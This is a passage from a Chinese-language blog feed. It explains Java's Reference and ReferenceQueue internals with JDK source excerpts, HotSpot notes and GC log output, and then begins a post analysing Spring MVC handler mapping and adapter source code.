 When an instance is removed from its ReferenceQueue, it is made Inactive. Unregistered instances are never in this state.(没有注册ReferenceQueue的不会有这个状态)</li><li><code>Inactive</code>: Nothing more to do.  Once an instance becomes Inactive its state will never change again.(终态)</li></ul><h3 id="引用链表"><a href="#引用链表" class="headerlink" title="引用链表"></a>引用链表</h3><p><code>Reference</code>中有五个关键的变量:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> T referent;         <span class="comment">/* Treated specially by GC */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">volatile</span> ReferenceQueue&lt;? <span class="keyword">super</span> T&gt; queue;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   NULL</span></span><br><span class="line"><span class="comment">    *     pending:   this</span></span><br><span class="line"><span class="comment">    *    Enqueued:   next reference in queue (or this if last)</span></span><br><span class="line"><span class="comment">    *    Inactive:   this</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@SuppressWarnings</span>(<span class="string">"rawtypes"</span>)</span><br><span class="line">   Reference next;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* When active:   next element in a discovered reference list maintained by GC (or this if last)</span></span><br><span class="line"><span class="comment">    *     pending:   next element in the pending list (or null if last)</span></span><br><span class="line"><span class="comment">    *   otherwise:   NULL</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">transient</span> <span class="keyword">private</span> Reference&lt;T&gt; discovered;  <span class="comment">/* used by VM */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* List of References waiting to be enqueued.  The collector adds</span></span><br><span class="line"><span class="comment">    * References to this list, while the Reference-handler thread removes</span></span><br><span class="line"><span class="comment">    * them.  This list is protected by the above lock object. The</span></span><br><span class="line"><span class="comment">    * list uses the discovered field to link its elements.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> Reference&lt;Object&gt; pending = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>referent</code></p><p>代表当前持有的引用. </p></li><li><p><code>queue</code></p><p>是初始化的时候传入的, 可以为null, 如果传入了<code>ReferenceQueue</code>, 会有入队列和出队列的操作</p></li><li><p><code>next</code></p><p>代表<code>ReferenceQueue</code>中的下一个, <code>Active</code>状态下是null,<br><code>Pending</code>和<code>Inactive</code>状态下指向自己, </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   +-------+</span><br><span class="line">   |       |</span><br><span class="line">   v       |</span><br><span class="line">           |</span><br><span class="line">+-----+    |</span><br><span class="line">|     |    |</span><br><span class="line">|  1  +----+</span><br><span class="line">|     |</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure><p><code>Enqueued</code>状态下指向<code>queue</code>中的下一个元素</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">                         +-------+</span><br><span class="line">                         |       |</span><br><span class="line">                         v       |</span><br><span class="line">                                 |</span><br><span class="line">+-----+    +-----+    +-----+    |</span><br><span class="line">|     |    |     |    |     |    |</span><br><span class="line">|  1  +--&gt; |  2  +--&gt; |  3  +----+</span><br><span class="line">|     |    |     |    |     |</span><br><span class="line">+-----+    +-----+    +-----+</span><br></pre></td></tr></table></figure><ul><li><p><code>discovered</code></p><p><code>Active</code>状态下指向<code>discovered reference list</code>中的下一个元素,<br><code>Pending</code>状态下指向<code>pending list</code>中的下一个元素,<br>其他状态下是null, 相关的链表是JVM维护的</p></li><li><p><code>pending</code></p></li></ul><p><code>pending</code>指向的是<code>pending list</code>链表的head</p><h3 id="tryHandlePending"><a href="#tryHandlePending" class="headerlink" title="tryHandlePending"></a>tryHandlePending</h3><p>处理引用的代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Try handle pending &#123;<span class="doctag">@link</span> Reference&#125; if there is one.&lt;p&gt;</span></span><br><span class="line"><span class="comment">     * Return &#123;<span class="doctag">@code</span> true&#125; as a hint that there might be another</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125; pending or &#123;<span class="doctag">@code</span> false&#125; when there are no more pending</span></span><br><span class="line"><span class="comment">     * &#123;<span class="doctag">@link</span> Reference&#125;s at the moment and the program can do some other</span></span><br><span class="line"><span class="comment">     * useful work instead of looping.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> waitForNotify if &#123;<span class="doctag">@code</span> true&#125; and there was no pending</span></span><br><span class="line"><span class="comment">     *                      &#123;<span class="doctag">@link</span> Reference&#125;, wait until notified from VM</span></span><br><span class="line"><span class="comment">     *                      or interrupted; if &#123;<span class="doctag">@code</span> false&#125;, return immediately</span></span><br><span class="line"><span class="comment">     *                      when there is no pending &#123;<span class="doctag">@link</span> Reference&#125;.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; if there was a &#123;<span class="doctag">@link</span> Reference&#125; pending and it</span></span><br><span class="line"><span class="comment">     *         was processed, or we waited for notification and either got it</span></span><br><span class="line"><span class="comment">     *         or thread was interrupted before being notified;</span></span><br><span class="line"><span class="comment">     *         &#123;<span class="doctag">@code</span> false&#125; otherwise.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">tryHandlePending</span><span class="params">(<span class="keyword">boolean</span> waitForNotify)</span> </span>&#123;</span><br><span class="line">        Reference&lt;Object&gt; r;</span><br><span class="line">        Cleaner c;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">                <span class="comment">// pending list不为null, 说明有需要处理的引用</span></span><br><span class="line">                <span class="keyword">if</span> (pending != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    r = pending;</span><br><span class="line">                    <span class="comment">// 'instanceof' might throw OutOfMemoryError sometimes</span></span><br><span class="line">                    <span class="comment">// so do this before un-linking 'r' from the 'pending' chain...</span></span><br><span class="line">                    c = r <span class="keyword">instanceof</span> Cleaner ? (Cleaner) r : <span class="keyword">null</span>;</span><br><span class="line">                    <span class="comment">// unlink 'r' from 'pending' chain</span></span><br><span class="line">                    <span class="comment">// 从pending list中删除r</span></span><br><span class="line">                    pending = r.discovered;</span><br><span class="line">                    r.discovered = <span class="keyword">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// The waiting on the lock may cause an OutOfMemoryError</span></span><br><span class="line">                    <span class="comment">// because it may try to allocate exception objects.</span></span><br><span class="line">                    <span class="keyword">if</span> (waitForNotify) &#123;</span><br><span class="line">                        <span class="comment">// 没有需要处理的引用, 就wait, 这个应该会被JVM给notify</span></span><br><span class="line">                        lock.wait();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// retry if waited</span></span><br><span class="line">                    <span class="keyword">return</span> waitForNotify;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (OutOfMemoryError x) &#123;</span><br><span class="line">            <span class="comment">// Give other threads CPU time so they hopefully drop some live references</span></span><br><span class="line">            <span class="comment">// and GC reclaims some space.</span></span><br><span class="line">            <span class="comment">// Also prevent CPU intensive spinning in case 'r instanceof Cleaner' above</span></span><br><span class="line">            <span class="comment">// persistently throws OOME for some time...</span></span><br><span class="line">            Thread.yield();</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException x) &#123;</span><br><span class="line">            <span class="comment">// retry</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Fast path for cleaners</span></span><br><span class="line">        <span class="keyword">if</span> (c != <span class="keyword">null</span>) &#123;</span><br><span class="line">            c.clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ReferenceQueue&lt;? <span class="keyword">super</span> Object&gt; q = r.queue;</span><br><span class="line">        <span class="comment">// 如果关联了ReferenceQueue, 就加入到ReferenceQueue中</span></span><br><span class="line">        <span class="keyword">if</span> (q != ReferenceQueue.NULL) q.enqueue(r);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="ReferenceQueue"><a href="#ReferenceQueue" class="headerlink" title="ReferenceQueue"></a>ReferenceQueue</h2><p><code>ReferenceQueue</code>用一个链表来维护队列里的<code>Reference</code></p><p>入队列相关的操作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(Reference&lt;? extends T&gt; r)</span> </span>&#123; <span class="comment">/* Called only by Reference class */</span></span><br><span class="line">       <span class="keyword">synchronized</span> (lock) &#123; <span class="comment">// 和队列相关的锁</span></span><br><span class="line">           <span class="comment">// Check that since getting the lock this reference hasn't already been</span></span><br><span class="line">           <span class="comment">// enqueued (and even then removed)</span></span><br><span class="line">           <span class="comment">// 校验下r带的队列是自己, 并且已经enqueue的不会重复enqueue</span></span><br><span class="line">           ReferenceQueue&lt;?&gt; queue = r.queue;</span><br><span class="line">           <span class="keyword">if</span> ((queue == NULL) || (queue == ENQUEUED)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">assert</span> queue == <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 修改Reference的queue为ENQUEUED, 代表已经入队了</span></span><br><span class="line">           r.queue = ENQUEUED;</span><br><span class="line">           <span class="comment">// 链表的头插发, 将当前的引用入队, 并更新head的值和队列的长度</span></span><br><span class="line">           r.next = (head == <span class="keyword">null</span>) ? r : head;</span><br><span class="line">           head = r;</span><br><span class="line">           queueLength++;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           lock.notifyAll();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>出队列相关的操作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">   <span class="keyword">private</span> Reference&lt;? extends T&gt; reallyPoll() &#123;       <span class="comment">/* Must hold lock */</span></span><br><span class="line">       Reference&lt;? extends T&gt; r = head;</span><br><span class="line">       <span class="keyword">if</span> (r != <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="comment">// 因为这个队列的尾节点的next总是指向自己, 这里判断如果是尾节点出队列, head置为null</span></span><br><span class="line">           head = (r.next == r) ?</span><br><span class="line">               <span class="keyword">null</span> :</span><br><span class="line">               r.next; <span class="comment">// Unchecked due to the next field having a raw type in Reference</span></span><br><span class="line">           <span class="comment">// 修改对应queue的状态, 代表已经出队列</span></span><br><span class="line">           r.queue = NULL;</span><br><span class="line">           <span class="comment">// 对于出队列的引用, 他的next也是指向自己的</span></span><br><span class="line">           r.next = r;</span><br><span class="line">           queueLength--;</span><br><span class="line">           <span class="keyword">if</span> (r <span class="keyword">instanceof</span> FinalReference) &#123;</span><br><span class="line">               sun.misc.VM.addFinalRefCount(-<span class="number">1</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="openjdk"><a href="#openjdk" class="headerlink" title="openjdk"></a>openjdk</h2><blockquote><p>上面两个变量对应在VM中的调用，可以参考openjdk中的hotspot源码，在hotspot/src/share/vm/memory/referenceProcessor.cpp 的ReferenceProcessor::discover_reference 方法。(根据此方法的注释由了解到虚拟机在对Reference的处理有ReferenceBasedDiscovery和RefeferentBasedDiscovery两种策略)</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> ReferenceProcessor::enqueue_discovered_reflist(DiscoveredList&amp; refs_list,</span><br><span class="line">                                                    HeapWord* pending_list_addr) &#123;</span><br><span class="line">  <span class="comment">// Given a list of refs linked through the "discovered" field</span></span><br><span class="line">  <span class="comment">// (java.lang.ref.Reference.discovered), self-loop their "next" field</span></span><br><span class="line">  <span class="comment">// thus distinguishing them from active References, then</span></span><br><span class="line">  <span class="comment">// prepend them to the pending list.</span></span><br><span class="line">  <span class="comment">// BKWRD COMPATIBILITY <span class="doctag">NOTE:</span> For older JDKs (prior to the fix for 4956777),</span></span><br><span class="line">  <span class="comment">// the "next" field is used to chain the pending list, not the discovered</span></span><br><span class="line">  <span class="comment">// field.</span></span><br><span class="line">  ...</span><br><span class="line">                                                    &#125;</span><br></pre></td></tr></table></figure><h2 id="GC日志"><a href="#GC日志" class="headerlink" title="GC日志"></a>GC日志</h2><p>在jvm的启动参数中加入下面的flag, 可以打开处理引用用掉的时间:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+PrintGCDetails -XX:+PrintReferenceGC</span><br></pre></td></tr></table></figure><p>测试代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testGc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       Object reference = <span class="keyword">new</span> Object();</span><br><span class="line">       <span class="keyword">final</span> WeakReference&lt;Object&gt; weakReference = <span class="keyword">new</span> WeakReference&lt;&gt;(reference);</span><br><span class="line"></span><br><span class="line">       Assert.assertEquals(reference, weakReference.get());</span><br><span class="line"></span><br><span class="line">       reference = <span class="keyword">null</span>;</span><br><span class="line">       System.gc();</span><br><span class="line"></span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * 当所引用的对象在 JVM 内不再有强引用时, GC 后 weak reference 将会被自动回收</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       Assert.assertNull(weakReference.get());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>日志输出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[GC (System.gc()) [SoftReference, 0 refs, 0.0000616 secs][WeakReference, 34 refs, 0.0000273 secs][FinalReference, 654 refs, 0.0003785 secs][PhantomReference, 0 refs, 0 refs, 0.0000060 secs][JNI Weak Reference, 0.0000023 secs][PSYoungGen: 10708K-&gt;1566K(56320K)] 10708K-&gt;1574K(184832K), 0.0083391 secs] [Times: user=0.01 sys=0.00, real=0.00 secs] </span><br><span class="line">[Full GC (System.gc()) [SoftReference, 0 refs, 0.0000153 secs][WeakReference, 1 refs, 0.0000035 secs][FinalReference, 85 refs, 0.0000111 secs][PhantomReference, 0 refs, 0 refs, 0.0000037 secs][JNI Weak Reference, 0.0000020 secs][PSYoungGen: 1566K-&gt;0K(56320K)] [ParOldGen: 8K-&gt;1438K(128512K)] 1574K-&gt;1438K(184832K), [Metaspace: 4770K-&gt;4770K(1056768K)], 0.0319906 secs] [Times: user=0.03 sys=0.00, real=0.04 secs] </span><br><span class="line">Heap</span><br><span class="line"> PSYoungGen      total 56320K, used 972K [0x0000000781e00000, 0x0000000785c80000, 0x00000007c0000000)</span><br><span class="line">  eden space 48640K, 2% used [0x0000000781e00000,0x0000000781ef3358,0x0000000784d80000)</span><br><span class="line">  from space 7680K, 0% used [0x0000000784d80000,0x0000000784d80000,0x0000000785500000)</span><br><span class="line">  to   space 7680K, 0% used [0x0000000785500000,0x0000000785500000,0x0000000785c80000)</span><br><span class="line"> ParOldGen       total 128512K, used 1438K [0x0000000705a00000, 0x000000070d780000, 0x0000000781e00000)</span><br><span class="line">  object space 128512K, 1% used [0x0000000705a00000,0x0000000705b679e0,0x000000070d780000)</span><br><span class="line"> Metaspace       used 4784K, capacity 5158K, committed 5248K, reserved 1056768K</span><br><span class="line">  class space    used 564K, capacity 593K, committed 640K, reserved 1048576K</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="http://hongjiang.info/java-referencequeue/#comment-4504" rel="external nofollow noopener noreferrer" target="_blank">话说ReferenceQueue | 写点什么</a></li><li><a href="https://cordate.github.io/2018/03/06/java/SharedSecrets%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3/" rel="external nofollow noopener noreferrer" target="_blank">SharedSecrets深入理解 | 柳絮纷飞</a></li><li><a href="http://www.iteye.com/topic/401478" rel="external nofollow noopener noreferrer" target="_blank">理解 Java 的 GC 与 幽灵引用 - Java - ITeye论坛</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;jvm中的Reference-Handler线程&quot;&gt;&lt;a href=&quot;#jvm中的Reference-Handler线程&quot; class=&quot;headerlink&quot; title=&quot;jvm中的Reference Handler线程&quot;&gt;&lt;/a&gt;jvm中的&lt;code&gt;Ref
      
    
    </summary>
    
      <category term="java" scheme="http://qsli.github.io/categories/java/"/>
    
    
      <category term="reference" scheme="http://qsli.github.io/tags/reference/"/>
    
  </entry>
  
  <entry>
    <title>Spring Mvc源码剖析(二)</title>
    <link href="http://qsli.github.io/2018/05/06/spring-mvc-2/"/>
    <id>http://qsli.github.io/2018/05/06/spring-mvc-2/</id>
    <published>2018-05-06T09:16:48.000Z</published>
    <updated>2018-08-11T12:42:42.674Z</updated>
    
    <content type="html"><![CDATA[<p>启动流程的分析见: <a href="/2016/10/02/spring-mvc/" title="Spring Mvc源码剖析(一)">Spring Mvc源码剖析(一)</a></p><img src="/2018/05/06/spring-mvc-2/spring-mvc.png"><h2 id="源码版本"><a href="#源码版本" class="headerlink" title="源码版本"></a>源码版本</h2><blockquote><p>4.3.6.RELEASE</p></blockquote><h2 id="HandlerExecutionChain"><a href="#HandlerExecutionChain" class="headerlink" title="HandlerExecutionChain"></a>HandlerExecutionChain</h2><p><em>request -&gt; executionchain</em></p><p>// RequestMappingHandlerMapping<br>遍历已有的<code>HandlerMapping</code>, 找到第一个能处理的<code>HandlerMapping</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerExecutionChain <span class="title">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (HandlerMapping hm : <span class="keyword">this</span>.handlerMappings) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(</span><br><span class="line"><span class="string">"Testing handler map ["</span> + hm + <span class="string">"] in DispatcherServlet with name '"</span> + getServletName() + <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">HandlerExecutionChain handler = hm.getHandler(request);</span><br><span class="line"><span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handlerMappings的值默认是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">this.handlerMappings = &#123;ArrayList@5980&#125;  size = 2</span><br><span class="line"> 0 = &#123;RequestMappingHandlerMapping@5997&#125; </span><br><span class="line"> 1 = &#123;BeanNameUrlHandlerMapping@6002&#125;</span><br></pre></td></tr></table></figure><p>org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler</p><p>executionchain就是interceptor和实际处理方法的结合体</p><h3 id="映射关系"><a href="#映射关系" class="headerlink" title="映射关系"></a>映射关系</h3><p><em>url -&gt; HandlerMethod</em></p><p>org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal</p><p><code>HandlerMethod</code>是具体的controller对应的方法.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mappingLookup = &#123;LinkedHashMap@6069&#125;  size = 4</span><br><span class="line"> 0 = &#123;LinkedHashMap$Entry@6077&#125; &quot;&#123;[/async]&#125;&quot; -&gt; &quot;public java.util.concurrent.Callable&lt;java.lang.String&gt; com.air.mvc.AsyncController.asyncProcess()&quot;</span><br><span class="line"> 1 = &#123;LinkedHashMap$Entry@6078&#125; &quot;&#123;[/asyncV2]&#125;&quot; -&gt; &quot;public org.springframework.web.context.request.async.DeferredResult&lt;java.lang.String&gt; com.air.mvc.AsyncController.aysncProcess2()&quot;</span><br><span class="line"> 2 = &#123;LinkedHashMap$Entry@6079&#125; &quot;&#123;[/mvc/echo]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(javax.servlet.http.HttpServletRequest)&quot;</span><br><span class="line"> 3 = &#123;LinkedHashMap$Entry@6080&#125; &quot;&#123;[/mvc/test]&#125;&quot; -&gt; &quot;private java.lang.String com.air.mvc.SampleController.echo(java.lang.String)&quot;</span><br></pre></td></tr></table></figure><h3 id="interceptor"><a href="#interceptor" class="headerlink" title="interceptor"></a>interceptor</h3><p><em>url -&gt; interceptors</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /mvc/test</span></span><br><span class="line">String lookupPath = <span class="keyword">this</span>.urlPathHelper.getLookupPathForRequest(request);</span><br><span class="line"><span class="keyword">for</span> (HandlerInterceptor interceptor : <span class="keyword">this</span>.adaptedInterceptors) &#123;</span><br><span class="line"><span class="keyword">if</span> (interceptor <span class="keyword">instanceof</span> MappedInterceptor) &#123;</span><br><span class="line">MappedInterceptor mappedInterceptor = (MappedInterceptor) interceptor;</span><br><span class="line"><span class="keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="keyword">this</span>.pathMatcher)) &#123;</span><br><span class="line">chain.addInterceptor(mappedInterceptor.getInterceptor());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">chain.addInterceptor(interceptor);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HandlerAdapter"><a href="#HandlerAdapter" class="headerlink" title="HandlerAdapter"></a>HandlerAdapter</h2><p><em>HandlerMethod -&gt; HandlerAdapter</em></p><p>// RequestMappingHandlerAdapter<br>org.springframework.web.servlet.DispatcherServlet#getHandlerAdapter</p><p>遍历所有的<code>HandlerAdapters</code>, 找到第一个能处理的<code>HandlerAdapter</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> HandlerAdapter <span class="title">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (HandlerAdapter ha : <span class="keyword">this</span>.handlerAdapters) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">logger.trace(<span class="string">"Testing handler adapter ["</span> + ha + <span class="string">"]"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ha.supports(handler)) &#123;</span><br><span class="line"><span class="keyword">return</span> ha;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ServletException(<span class="string">"No adapter for handler ["</span> + handler +</span><br><span class="line"><span class="string">"]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认的<code>HandlerAdapters</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 